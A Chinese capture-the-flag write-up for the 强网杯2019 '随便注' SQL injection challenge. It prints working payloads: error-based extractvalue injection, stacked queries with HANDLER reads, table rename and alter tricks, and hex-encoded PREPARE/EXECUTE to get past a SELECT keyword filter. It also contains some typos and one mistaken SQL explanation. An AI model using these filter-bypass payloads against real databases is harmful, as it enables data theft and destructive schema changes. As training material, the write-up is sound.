    [强网杯2019]随便注

    经过简单的探索之后发现他有注入点，而且过滤了以下的符号

    ("/select|update|delete|drop|insert|where|\./i",$inject)

    这样呢 我们很多方法都不能使用了，不过呢如果有sqlmap那就是很好用的，但是缺少了灵魂。

    所以我们这里还是选择手工注入

    首先呢我们发现他有报错回显，所以我们选择报错注入。但是呢，我们的updata被过滤了，这时就要用其他的报错注入或者把updataxml给转成其他编码并解码解读，不过第二种方法就麻烦很多了，

    我们使用第一中方法把。

    构造这样的注入

    -1' and extractvalue(1,concat(0x7e,database(),0x7e))#

    我们会得到以下信息

    获得数据库supersqli

    但是接下来的注入就会用到slect了怎么办

    我们来看看sql注入独有的一种注入方式：

    handler语法

    可以具体在这里学学
    https://blog.csdn.net/JesseYoung/article/details/40785137

    1'; use supersqli;show tables;#

    我们进行下一步解题，发现有两个表格

    两个表都看看

    1';show columns from `1919810931114514` ;#
1';show columns from words ;#

    发现在1919810931114514这个表中发现了flag这个字段

    用刚刚提到的handler语句

    1'; use supersqli;handler `1919810931114514` open;handler `1919810931114514` read first;#

    就拿到flag啦

    但是这题又很多方法，查了很多大佬的博客，这里再学习学习

    因为这里有两张表，回显内容肯定是从word这张表中回显的，那我们怎么才能让它回显flag所在的表呢。

    内部查询语句类似 : select id, data from word where id =

    (这里从上面的对word列的查询可以看到它是有两列，id和data)

    然后1919810931114514只有一个flag字段

    这时候虽然有强大的正则过滤，但没有过滤## alert和rename关键字 ##

    这时候我们就可以已下面的骚姿势进行注入：

    1.将words表改名为word1或其它任意名字

    2.1919810931114514改名为words

    3.将新的word表插入一列，列名为id

    4.将flag列改名为data

    构造payload：

    1'; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#

    这里的int unsigned not Null auto_increment primary key
    好久没看到了，差点没看懂，意思是给id这段字段给的格式要求，

    意思是：不允许空的无字符的无密钥int类型字段（一段段解读就好啦）

    int unsigned not Null auto_increment primary key

    int unsigned not Null auto_increment primary key

    int unsigned not Null auto_increment primary key

    不懂的东西输入三遍，加深记忆

    第三种方法：编码转化

    因为slect被过滤了，所以我们想要使用slect语句就变得很麻烦

    这里可以将

    select * from 1919810931114514进行十六进制的编码

    0x73656c656374202a2066726f6d20603139313938313039333131313435313460

    构造payload
    -1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#

    没事 我也看不懂，查查资料就可以懂了

    • prepare…from…是预处理语句，会进行编码转换。

    • execute用来执行由SQLPrepare创建的SQL语句。

    • SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值

    • SeT@a=:设置a

    • prepare execsql from @a：预处理语句a

    • execute execsql：执行execssql，也就是from a的语句

    第四种方法：sqlmap
